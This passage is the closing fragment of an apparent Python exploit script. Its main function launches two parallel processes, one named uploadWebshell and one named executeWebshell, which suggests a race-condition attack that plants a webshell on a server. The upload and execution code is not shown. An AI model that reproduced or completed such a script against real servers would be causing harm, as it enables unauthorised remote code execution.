        print r.text

def main():
    p1 = Process(target = uploadWebshell)
    p2 = Process(target = executeWebshell)

    p1.start()
    p2.start()

if __name__ == '__main__':
    main()
```
